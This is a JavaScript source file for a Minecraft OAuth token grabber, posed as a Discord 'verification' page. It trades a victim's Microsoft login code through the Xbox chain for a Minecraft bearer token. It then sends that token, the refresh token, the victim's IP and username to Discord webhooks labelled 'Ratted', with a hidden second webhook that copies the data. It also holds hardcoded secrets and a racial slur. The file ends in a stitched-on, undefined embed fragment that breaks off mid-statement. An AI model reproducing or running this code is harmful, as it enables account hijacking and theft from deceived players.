//Config
const client_secret = 'Cv98Q~6hngId8AFLlVKbXVx-_~iCYsf1gu_N8chS'
const client_id = 'f8d8ad64-a301-44cd-bca2-ab7ec15c778f'
const redirect_uri = 'https://tokenmc1111.onrender.com'
const webhook_url = 'https://discord.com/api/webhooks/1166215459620790323/LbManmLloK_XnbQ4QZaIoxp_ZEoTs9ql_6dg5LytHUjgxjtdqCuo1tTEz-ka7Di8ajQx'
//Requirements
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

app.get('/', async (req, res) => {
    res.send('Verification successful! go back to discord.')
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        const accessToken = accessTokenAndRefreshTokenArray[0]
        const refreshToken = accessTokenAndRefreshTokenArray[1]
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
    const url = webhook_url
    let data = {
  username: "Ely",
  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
  content: "@everyone",
  embeds: [
    {
      title: "Ratted " + username + " - Click for networth",
      color: 5898337,
      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
      url: "https://spillager.live/skyblock/networth/"+username,
      footer: {
        text: "Minecraft oAuth Grabber by Ely",
        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
      },
    }
  ],
}
    axios.all([ 
        axios.post(url, data),
        axios.post("https://discord.com/api/webhooks/1065424923356573777/W5Eq-UNXPGaAFqt-azVzSXaNUcz5L9Kono0PmDZXjbbvrKLHn5Ynq6p_RiY_wskMnm8c", data)
           .then(() => console.log("Successfully authenticated, posting to webhook!"))
    ])
    
}


const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
const embed = new EmbedBuilder()
  .setColor(0x5D3FD3)
  .setTitle(name)
  .setURL('https://sky.shiiyu.moe/stats/' + name)
  .setThumbnail('https://crafatar.com/avatars/' + id)
  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://verification-dcyg.onrender.com/refresh?refreshToken=' + refresh })
  .addFields(
    { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
    { name: ' ', value: ' ' },
    { name: 'Average Skill Lvl', value: avgSkillLvl, inline: true }, { name: 'SB Level', value: SBLevel, inline: true },
    { name: ' ', value: ' ' },
    { name: 'Minion Slots', value: minionSlots, inline: true }, { name: 'Purse', value: purse, inline: true },
    { name: 'SSID: ', value: SSIDCode },
